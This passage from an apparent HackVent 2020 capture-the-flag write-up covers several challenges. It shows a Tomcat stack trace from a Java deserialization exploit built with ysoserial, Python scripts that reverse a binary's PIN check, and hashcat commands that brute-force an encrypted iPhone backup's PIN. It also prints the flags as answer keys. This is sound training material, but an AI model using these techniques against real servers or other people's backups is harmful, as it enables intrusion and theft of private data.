    org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:493)
    org.apache.catalina.connector.Request.doGetSession(Request.java:2978)
    org.apache.catalina.connector.Request.getSessionInternal(Request.java:2698)
    org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:511)
    org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
    org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
    org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
    org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
    org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
    org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
    org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
    org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
    java.base&amp;#47;java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)
    java.base&amp;#47;java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)
    org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    java.base&amp;#47;java.lang.Thread.run(Thread.java:832)
&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Root Cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.reflect.InvocationTargetException
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    java.base&amp;#47;jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    java.base&amp;#47;java.lang.reflect.Method.invoke(Method.java:564)
    org.apache.commons.collections4.functors.InvokerTransformer.transform(InvokerTransformer.java:129)
    org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
    java.base&amp;#47;java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:713)
    java.base&amp;#47;java.util.PriorityQueue.heapify(PriorityQueue.java:735)
    java.base&amp;#47;java.util.PriorityQueue.readObject(PriorityQueue.java:802)
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    java.base&amp;#47;jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    java.base&amp;#47;java.lang.reflect.Method.invoke(Method.java:564)
    java.base&amp;#47;java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1216)
    java.base&amp;#47;java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2359)
    java.base&amp;#47;java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2193)
    java.base&amp;#47;java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1685)
    java.base&amp;#47;java.io.ObjectInputStream.readObject(ObjectInputStream.java:499)
    java.base&amp;#47;java.io.ObjectInputStream.readObject(ObjectInputStream.java:457)
    org.apache.catalina.session.StandardSession.doReadObject(StandardSession.java:1554)
    org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:1049)
    org.apache.catalina.session.FileStore.load(FileStore.java:229)
    org.apache.catalina.session.PersistentManagerBase.loadSessionFromStore(PersistentManagerBase.java:764)
    org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:714)
    org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:493)
    org.apache.catalina.connector.Request.doGetSession(Request.java:2978)
    org.apache.catalina.connector.Request.getSessionInternal(Request.java:2698)
    org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:511)
    org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
    org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
    org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
    org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
    org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
    org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
    org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
    org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
    java.base&amp;#47;java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)
    java.base&amp;#47;java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)
    org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    java.base&amp;#47;java.lang.Thread.run(Thread.java:832)
&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Root Cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.NullPointerException
    java.xml&amp;#47;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:372)
    java.xml&amp;#47;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:557)
    java.xml&amp;#47;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:584)
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    java.base&amp;#47;jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    java.base&amp;#47;java.lang.reflect.Method.invoke(Method.java:564)
    org.apache.commons.collections4.functors.InvokerTransformer.transform(InvokerTransformer.java:129)
    org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
    java.base&amp;#47;java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:713)
    java.base&amp;#47;java.util.PriorityQueue.heapify(PriorityQueue.java:735)
    java.base&amp;#47;java.util.PriorityQueue.readObject(PriorityQueue.java:802)
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    java.base&amp;#47;jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    java.base&amp;#47;java.lang.reflect.Method.invoke(Method.java:564)
    java.base&amp;#47;java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1216)
    java.base&amp;#47;java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2359)
    java.base&amp;#47;java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2193)
    java.base&amp;#47;java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1685)
    java.base&amp;#47;java.io.ObjectInputStream.readObject(ObjectInputStream.java:499)
    java.base&amp;#47;java.io.ObjectInputStream.readObject(ObjectInputStream.java:457)
    org.apache.catalina.session.StandardSession.doReadObject(StandardSession.java:1554)
    org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:1049)
    org.apache.catalina.session.FileStore.load(FileStore.java:229)
    org.apache.catalina.session.PersistentManagerBase.loadSessionFromStore(PersistentManagerBase.java:764)
    org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:714)
    org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:493)
    org.apache.catalina.connector.Request.doGetSession(Request.java:2978)
    org.apache.catalina.connector.Request.getSessionInternal(Request.java:2698)
    org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:511)
    org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
    org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
    org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
    org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
    org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
    org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
    org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
    org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
    java.base&amp;#47;java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)
    java.base&amp;#47;java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)
    org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    java.base&amp;#47;java.lang.Thread.run(Thread.java:832)
&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;h3&gt;Apache Tomcat/9.0.34&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>Everything that remained to do was downloading the file and read out the flag.</p>
<h2 id="tools-13">Tools</h2>
<ul>
<li>ysoserial - <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li>
<li>BurpSuite</li>
<li>DuckDuckGo</li>
</ul>
<h2 id="flag-20">Flag</h2>
<p><code>HV20{!D3s3ri4liz4t10n_rulz!}</code></p>
<h1 id="hv2022-padawanlock">HV20.22 Padawanlock</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>inik</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>reverse engineering</code></td>
</tr>
</tbody>
</table>
<h2 id="description-21">Description</h2>
<p>A new apprentice Elf heard about "Configuration as Code". When he had to solve the problem to protected a secret he came up with this "very sophisticated padlock".</p>
<p><a href="./6a6fbeb6-3556-4b76-ba4c-daf5f2bfffc4.zip">Download</a></p>
<h2 id="approach-20">Approach</h2>
<p>Let's get an overview of what happens in the (unzipped) file.</p>
<p>Running the (regular ELF) binary prompts for a PIN and then prints an "unlocked secret".</p>
<div class="sourceCode" id="cb73"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb73-1"><a href="#cb73-1"></a>$ <span class="ex">./padawanlock</span> </span>
<span id="cb73-2"><a href="#cb73-2"></a><span class="ex">PIN</span> (6 digits)<span class="bu">:</span> 123456</span>
<span id="cb73-3"><a href="#cb73-3"></a><span class="ex">Unlocked</span> secret is: _IMPERIAL_CRUISER.)}</span></code></pre></div>
<p>Secrets are always somewhat readable strings - which, however, do not appear when printing out all readable strings in the binary using <code>strings padawanlock</code>. Only the prompt and the "Unlocked secret" string can be found.</p>
<p>In Ghidra, I tried to find where these strings are printed. Following references to these places, I arrived at the core logic, which seems to happen at <code>0x000111d9</code>:</p>
<p><img src="ghidra_main_procedure.png" alt="Main procedure" /></p>
<ul>
<li>The 6-digit PIN is read.</li>
<li>The PIN is used to compute a new address using the formula <code>PIN * 0x14 + 0x1124b</code>.</li>
<li>Control flow jumps to the new address.</li>
<li>Whenever the program returns, the string is printed out.</li>
</ul>
<p>Looking at the first possible position at <code>0x1124b</code> (considering the base address being at <code>0x10000</code>), we discover a sequence of blocks, each turning round (supposedly to make the program slow as a brute-force prevention measure) and loading a different character to be be printed out and finally calling another block.</p>
<p><img src="ghidra_character_loading_blocks.png" alt="Jump table blocks" /></p>
<p>All blocks have the same length of 20 bytes (hence the <code>0x14</code> in the above computation).</p>
<p>Since we're looking for a string starting with characters <code>HV20{</code> (supposedly), we can look for blocks that load an <code>H</code> and then call to a block loading a <code>V</code>.</p>
<p>I started off, trying to do that in Ghidra using the Jython console, but I realised I didn't know the framework well enough, so I switched to a hybrid approach first, followed by a cleaner python-only approach.</p>
<h3 id="approach-i-hybrid">Approach I: Hybrid</h3>
<p>I then went with a hybrid approach, using <code>xxd</code> and some custom <code>python</code> script:</p>
<p>Grep intersting blocks loading characters "H" and "V" (the string to grep for was taken over manually from Ghidra, it corresponds to binary opcodes):</p>
<div class="sourceCode" id="cb74"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb74-1"><a href="#cb74-1"></a><span class="co"># The following dumps all occurences into a text file, prefixed by the line number at which they were found.</span></span>
<span id="cb74-2"><a href="#cb74-2"></a><span class="co"># The line number will be helpful to compute the instruction address again.</span></span>
<span id="cb74-3"><a href="#cb74-3"></a><span class="ex">xxd</span> -s 3 -ps -c 20 padawanlock <span class="kw">|</span> <span class="fu">grep</span> -n <span class="st">&#39;f90075fac6034843&#39;</span> <span class="op">&gt;</span> H_search.txt <span class="co"># H == 0x48</span></span>
<span id="cb74-4"><a href="#cb74-4"></a><span class="ex">xxd</span> -s 3 -ps -c 20 padawanlock <span class="kw">|</span> <span class="fu">grep</span> -n <span class="st">&#39;f90075fac6035643&#39;</span> <span class="op">&gt;</span> V_search.txt <span class="co"># V == 0x56</span></span></code></pre></div>
<p>With that, try to find all "H"-loading blocks that are followed by a "V"-loading block (in python):</p>
<div class="sourceCode" id="cb75"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb75-1"><a href="#cb75-1"></a><span class="co">#!/usr/bin/env python</span></span>
<span id="cb75-2"><a href="#cb75-2"></a></span>
<span id="cb75-3"><a href="#cb75-3"></a>OFFSET <span class="op">=</span> <span class="bn">0x3</span></span>
<span id="cb75-4"><a href="#cb75-4"></a>LINE_WIDTH <span class="op">=</span> <span class="bn">0x14</span></span>
<span id="cb75-5"><a href="#cb75-5"></a>JUMP <span class="op">=</span> <span class="bn">0x1124b</span></span>
<span id="cb75-6"><a href="#cb75-6"></a>BASE_ADDR <span class="op">=</span> <span class="bn">0x10000</span></span>
<span id="cb75-7"><a href="#cb75-7"></a></span>
<span id="cb75-8"><a href="#cb75-8"></a></span>
<span id="cb75-9"><a href="#cb75-9"></a><span class="kw">def</span> parse_line(line: <span class="bu">str</span>):</span>
<span id="cb75-10"><a href="#cb75-10"></a>    (lnb, code) <span class="op">=</span> line.split(<span class="st">&quot;:&quot;</span>, <span class="dv">1</span>)</span>
<span id="cb75-11"><a href="#cb75-11"></a>    addr <span class="op">=</span> OFFSET <span class="op">+</span> (<span class="bu">int</span>(lnb) <span class="op">-</span> <span class="dv">1</span>) <span class="op">*</span> LINE_WIDTH</span>
<span id="cb75-12"><a href="#cb75-12"></a>    <span class="bu">next</span> <span class="op">=</span> <span class="bu">bytearray</span>.fromhex(code.strip()[<span class="op">-</span><span class="dv">4</span> <span class="op">*</span> <span class="dv">2</span>:])</span>
<span id="cb75-13"><a href="#cb75-13"></a>    <span class="co"># Returns a tuple:</span></span>
<span id="cb75-14"><a href="#cb75-14"></a>    <span class="co"># (&lt;address of this block&gt;, &lt;address of referenced/next block&gt;)</span></span>
<span id="cb75-15"><a href="#cb75-15"></a>    <span class="cf">return</span> addr, addr <span class="op">+</span> <span class="bu">int</span>.from_bytes(<span class="bu">next</span>, <span class="st">&#39;little&#39;</span>) <span class="op">+</span> LINE_WIDTH</span>
<span id="cb75-16"><a href="#cb75-16"></a></span>
<span id="cb75-17"><a href="#cb75-17"></a></span>
<span id="cb75-18"><a href="#cb75-18"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
<span id="cb75-19"><a href="#cb75-19"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;H_search.txt&quot;</span>, <span class="st">&quot;r&quot;</span>) <span class="im">as</span> hfd:</span>
<span id="cb75-20"><a href="#cb75-20"></a>        h_map <span class="op">=</span> {x[<span class="dv">1</span>]: x[<span class="dv">0</span>] <span class="cf">for</span> x <span class="kw">in</span> [parse_line(l) <span class="cf">for</span> l <span class="kw">in</span> hfd.readlines()]}</span>
<span id="cb75-21"><a href="#cb75-21"></a></span>
<span id="cb75-22"><a href="#cb75-22"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;V_search.txt&quot;</span>, <span class="st">&quot;r&quot;</span>) <span class="im">as</span> vfd:</span>
<span id="cb75-23"><a href="#cb75-23"></a>        v_addr <span class="op">=</span> [parse_line(l)[<span class="dv">0</span>] <span class="cf">for</span> l <span class="kw">in</span> vfd.readlines()]</span>
<span id="cb75-24"><a href="#cb75-24"></a></span>
<span id="cb75-25"><a href="#cb75-25"></a></span>
<span id="cb75-26"><a href="#cb75-26"></a>    res <span class="op">=</span> [(h_map[x] <span class="op">-</span> (JUMP <span class="op">-</span> BASE_ADDR))<span class="op">/</span><span class="bn">0x14</span> <span class="cf">for</span> x <span class="kw">in</span> <span class="bu">set</span>(h_map.keys()).intersection(<span class="bu">set</span>(v_addr))]</span>
<span id="cb75-27"><a href="#cb75-27"></a>    <span class="bu">print</span>(res)</span>
<span id="cb75-28"><a href="#cb75-28"></a></span></code></pre></div>
<p>When run, this code prints out a single result being <code>451235</code>, which corresponds to the PIN we're looking for.</p>
<h3 id="approach-ii-python-only">Approach II: Python only</h3>
<p>A cleaner approach is to keep everything in python. The logic stays the same:</p>
<ul>
<li>We have to look for given byte sequences,</li>
<li>correlate these blocks (by their address and the address of the next block they call),</li>
<li>reverse the PIN-calculation</li>
<li>find the PIN.</li>
</ul>
<div class="sourceCode" id="cb76"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb76-1"><a href="#cb76-1"></a><span class="co">#!/usr/bin/env python</span></span>
<span id="cb76-2"><a href="#cb76-2"></a></span>
<span id="cb76-3"><a href="#cb76-3"></a>BLOCK_LENGTH <span class="op">=</span> <span class="bn">0x14</span></span>
<span id="cb76-4"><a href="#cb76-4"></a>FIRST_BLOCK_ADDR <span class="op">=</span> <span class="bn">0x1124b</span></span>
<span id="cb76-5"><a href="#cb76-5"></a>ELF_BASE_ADDR <span class="op">=</span> <span class="bn">0x10000</span></span>
<span id="cb76-6"><a href="#cb76-6"></a></span>
<span id="cb76-7"><a href="#cb76-7"></a><span class="kw">def</span> find_addresses(blob, b):</span>
<span id="cb76-8"><a href="#cb76-8"></a>    addresses <span class="op">=</span> []</span>
<span id="cb76-9"><a href="#cb76-9"></a>    needle <span class="op">=</span> <span class="bu">bytearray</span>.fromhex(b)</span>
<span id="cb76-10"><a href="#cb76-10"></a>    a <span class="op">=</span> blob.find(needle)</span>
<span id="cb76-11"><a href="#cb76-11"></a>    <span class="cf">while</span> a <span class="op">!=</span> <span class="dv">-1</span>:</span>
<span id="cb76-12"><a href="#cb76-12"></a>        addresses.append(a <span class="op">-</span> <span class="dv">5</span>)</span>
<span id="cb76-13"><a href="#cb76-13"></a>        a <span class="op">=</span> blob.find(needle,a<span class="op">+</span><span class="dv">1</span>)</span>
<span id="cb76-14"><a href="#cb76-14"></a>    <span class="cf">return</span> addresses</span>
<span id="cb76-15"><a href="#cb76-15"></a></span>
<span id="cb76-16"><a href="#cb76-16"></a><span class="kw">def</span> find_next_addr(blob, curr_addr):</span>
<span id="cb76-17"><a href="#cb76-17"></a>    jmp_bytes <span class="op">=</span> blob[curr_addr <span class="op">+</span> BLOCK_LENGTH <span class="op">-</span> <span class="dv">4</span>:curr_addr <span class="op">+</span> BLOCK_LENGTH]</span>
<span id="cb76-18"><a href="#cb76-18"></a>    jmp_int <span class="op">=</span> <span class="bu">int</span>.from_bytes(jmp_bytes, <span class="st">&#39;little&#39;</span>)</span>
<span id="cb76-19"><a href="#cb76-19"></a>    <span class="cf">return</span> curr_addr <span class="op">+</span> BLOCK_LENGTH <span class="op">+</span> jmp_int</span>
<span id="cb76-20"><a href="#cb76-20"></a></span>
<span id="cb76-21"><a href="#cb76-21"></a></span>
<span id="cb76-22"><a href="#cb76-22"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
<span id="cb76-23"><a href="#cb76-23"></a></span>
<span id="cb76-24"><a href="#cb76-24"></a>    <span class="co"># Search strings to search for all block loading &quot;H&quot; (0x48) or &quot;V&quot; (0x56).</span></span>
<span id="cb76-25"><a href="#cb76-25"></a>    <span class="co"># These strings of bytes were identified using Ghidra.</span></span>
<span id="cb76-26"><a href="#cb76-26"></a>    load_h_bytes <span class="op">=</span> <span class="st">&quot;4983f90075fac6034843e9&quot;</span></span>
<span id="cb76-27"><a href="#cb76-27"></a>    load_v_bytes <span class="op">=</span> <span class="st">&quot;4983f90075fac6035643e9&quot;</span></span>
<span id="cb76-28"><a href="#cb76-28"></a></span>
<span id="cb76-29"><a href="#cb76-29"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;padawanlock&quot;</span>, <span class="st">&quot;rb&quot;</span>) <span class="im">as</span> pfd:</span>
<span id="cb76-30"><a href="#cb76-30"></a>        blob <span class="op">=</span> pfd.read()</span>
<span id="cb76-31"><a href="#cb76-31"></a></span>
<span id="cb76-32"><a href="#cb76-32"></a>    h_loading <span class="op">=</span> find_addresses(blob, load_h_bytes)</span>
<span id="cb76-33"><a href="#cb76-33"></a>    v_loading <span class="op">=</span> find_addresses(blob, load_v_bytes)</span>
<span id="cb76-34"><a href="#cb76-34"></a></span>
<span id="cb76-35"><a href="#cb76-35"></a>    <span class="co"># Create a map &lt;next_addr&gt; -&gt; &lt;current_addr&gt; for all blocks loading &quot;H&quot;</span></span>
<span id="cb76-36"><a href="#cb76-36"></a>    h_references <span class="op">=</span> {find_next_addr(blob, addr): addr <span class="cf">for</span> addr <span class="kw">in</span> h_loading}</span>
<span id="cb76-37"><a href="#cb76-37"></a></span>
<span id="cb76-38"><a href="#cb76-38"></a>    <span class="co"># Find all blocks loading &quot;H&quot; that are followed by a block loading &quot;V&quot;</span></span>
<span id="cb76-39"><a href="#cb76-39"></a>    v_refs <span class="op">=</span> <span class="bu">set</span>(h_references.keys()).intersection(<span class="bu">set</span>(v_loading))</span>
<span id="cb76-40"><a href="#cb76-40"></a>    h_addrs <span class="op">=</span> [h_references[x] <span class="cf">for</span> x <span class="kw">in</span> v_refs]</span>
<span id="cb76-41"><a href="#cb76-41"></a></span>
<span id="cb76-42"><a href="#cb76-42"></a>    <span class="co"># Compute the inverse calculation of `PIN * 0x14 + 0x1124b` (need to subtract the </span></span>
<span id="cb76-43"><a href="#cb76-43"></a>    <span class="co"># base address at which ELF files are loaded into memory)</span></span>
<span id="cb76-44"><a href="#cb76-44"></a>    <span class="bu">print</span>([<span class="bu">int</span>((x <span class="op">-</span> (FIRST_BLOCK_ADDR <span class="op">-</span> ELF_BASE_ADDR)) <span class="op">/</span> BLOCK_LENGTH) <span class="cf">for</span> x <span class="kw">in</span> h_addrs])</span></code></pre></div>
<p>This snippet prints the same PIN being <code>451235</code>.</p>
<p>When run using the resulting PIN, the binary indeed prints the flag:</p>
<div class="sourceCode" id="cb77"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb77-1"><a href="#cb77-1"></a>$ <span class="ex">./padawanlock</span> </span>
<span id="cb77-2"><a href="#cb77-2"></a><span class="ex">PIN</span> (6 digits)<span class="bu">:</span> 451235</span>
<span id="cb77-3"><a href="#cb77-3"></a><span class="ex">Unlocked</span> secret is: HV20<span class="dt">{C0NF1GUR4T10N_AS_C0D3_N0T_D0N3_R1GHT}</span></span></code></pre></div>
<h2 id="tools-14">Tools</h2>
<ul>
<li>python</li>
<li>Ghidra</li>
</ul>
<h2 id="flag-21">Flag</h2>
<p><code>HV20{C0NF1GUR4T10N_AS_C0D3_N0T_D0N3_R1GHT}</code></p>
<h1 id="hv2023-those-who-make-backups-are-cowards">HV20.23 Those who make backups are cowards!</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>hardlock</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>crypto</code>, <code>ios</code></td>
</tr>
</tbody>
</table>
<h2 id="description-22">Description</h2>
<p>Santa tried to get an important file back from his old mobile phone backup. Thankfully he left a post-it note on his phone with the PIN. Sadly Rudolph thought the Apple was real and started eating it (there we go again...). Now only the first of eight digits, a <strong>2</strong>, is still visible...</p>
<p>But maybe you can do something to help him get his important stuff back?</p>
<p><a href="./65195ba5-2dac-49a4-9606-c9d8733bebcf.rar">Download</a></p>
<h3 id="hints-12">Hints</h3>
<ul>
<li>If you get stuck, call Shamir</li>
</ul>
<h2 id="approach-21">Approach</h2>
<p>It seems, we're given an encrypted iPhone backup. Unpacking the archive produces a bunch of encrypted files and some with a more telling filename:</p>
<pre><code>$ ls -al
total 16768
drwxr-xr-x 2 hacker hacker   28672 Dec 16 21:47 .
drwxr-xr-x 7 hacker hacker    4096 Dec 23 02:05 ..
-rw-r--r-- 1 hacker hacker     240 Dec 16 21:47 000cae3437db21095a85771716e6874f92ce7593
-rw-r--r-- 1 hacker hacker     144 Dec 16 21:47 012707a2ae34d77a28b16a9e443b780ea4e6b0aa
-rw-r--r-- 1 hacker hacker   14224 Dec 16 21:47 01a14737bf725839e60201704f5e0447e23800a6
-rw-r--r-- 1 hacker hacker      48 Dec 16 21:47 02080c751f0cd98738a2e9ccf7c133f0197865fa
-rw-r--r-- 1 hacker hacker     576 Dec 16 21:47 02dcc29d169dda989f3402fe07d8b6526d6fb1ac
-rw-r--r-- 1 hacker hacker      48 Dec 16 21:47 0354ef572fa6f5f20370be41aa816bd69cb2a642
-rw-r--r-- 1 hacker hacker     272 Dec 16 21:47 0468d26ad5dc28df372736abb757ed6457c7eed1
[...]
-rw-r--r-- 1 hacker hacker   1399 Dec 16 21:47 DDNABackup.plist
-rw-r--r-- 1 hacker hacker   8579 Dec 16 21:47 Info.plist
-rw-r--r-- 1 hacker hacker 101463 Dec 16 21:47 Manifest.mbdb
-rw-r--r-- 1 hacker hacker   9221 Dec 16 21:47 Manifest.plist
-rw-r--r-- 1 hacker hacker    189 Dec 16 21:47 Status.plist
</code></pre>
<p>Some web searching brought me to the following article <a href="https://medium.com/taptuit/breaking-into-encrypted-iphone-backups-4dacc39403f0">https://medium.com/taptuit/breaking-into-encrypted-iphone-backups-4dacc39403f0</a>, which in turn leads to <a href="https://github.com/philsmd/itunes_backup2hashcat">https://github.com/philsmd/itunes_backup2hashcat</a> to retrieve the hash of the backup encryption.</p>
<div class="sourceCode" id="cb79"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb79-1"><a href="#cb79-1"></a><span class="ex">./itunes_backup2hashcat.pl</span> ../5e8dfbc7f9f29a7645d66ef70b6f2d3f5dad8583/Manifest.plist</span>
<span id="cb79-2"><a href="#cb79-2"></a><span class="va">$itunes_backup$*</span><span class="ex">9*892dba473d7ad9486741346d009b0deeccd32eea6937ce67070a0500b723c871a454a81e569f95d9*10000*0834c7493b056222d7a7e382a69c0c6a06649d9a**</span></span></code></pre></div>
<p>Using that hash combined with the information given in the challenge description, we can craft a <code>hashcat</code> command:</p>
<p>The password/PIN to crack:</p>
<ul>
<li>has 8 positions</li>
<li>all digits</li>
<li>the first digit is "2"</li>
<li>has known format, hence we can run a mask attack (sub-type of brute-force attack, hence <code>-a 3</code>)</li>
</ul>
<div class="sourceCode" id="cb80"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb80-1"><a href="#cb80-1"></a><span class="ex">hashcat</span> -m 14700 -o recovered.hash -a 3 hash.pwd 2?d?d?d?d?d?d?d</span></code></pre></div>
<p>The resulting string is:</p>
<pre><code>$itunes_backup$*9*892dba473d7ad9486741346d009b0deeccd32eea6937ce67070a0500b723c871a454a81e569f95d9*10000*0834c7493b056222d7a7e382a69c0c6a06649d9a**:20201225
</code></pre>
<p>The PIN is <code>20201225</code> (who would have thought someone would shoot beyond the limits of this HackVent...?).</p>
<p>Some other resources, I stumbled over for this first phase of this challenge (which could be useful for other CTFs) are:</p>
<ul>
<li>Mapping SHA1 hashes to file names: <a href="https://www.richinfante.com/2017/3/16/reverse-engineering-the-ios-backup/">https://www.richinfante.com/2017/3/16/reverse-engineering-the-ios-backup/</a></li>
<li>Read out Manifest.mbdb: <a href="https://stackoverflow.com/questions/3085153/how-to-parse-the-manifest-mbdb-file-in-an-ios-4-0-itunes-backup">https://stackoverflow.com/questions/3085153/how-to-parse-the-manifest-mbdb-file-in-an-ios-4-0-itunes-backup</a></li>
<li>Decrypt files: <a href="https://stackoverflow.com/questions/1498342/how-to-decrypt-an-encrypted-apple-itunes-iphone-backup">https://stackoverflow.com/questions/1498342/how-to-decrypt-an-encrypted-apple-itunes-iphone-backup</a></li>
</ul>
<p>Using <code>backup_tool.py</code> from <a href="https://github.com/dinosec/iphone-dataprotection">https://github.com/dinosec/iphone-dataprotection</a> we can then decrypt the files from the backup. the library, however, requires a small patch first:</p>
<div class="sourceCode" id="cb82"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb82-1"><a href="#cb82-1"></a>$ git diff crypto/aeswrap.py</span>
<span id="cb82-2"><a href="#cb82-2"></a><span class="kw">diff --git a/python_scripts/crypto/aeswrap.py b/python_scripts/crypto/aeswrap.py</span></span>
<span id="cb82-3"><a href="#cb82-3"></a>index 75dbb84..4ef2ca6 100644</span>
<span id="cb82-4"><a href="#cb82-4"></a><span class="dt">--- a/python_scripts/crypto/aeswrap.py</span></span>
<span id="cb82-5"><a href="#cb82-5"></a><span class="dt">+++ b/python_scripts/crypto/aeswrap.py</span></span>
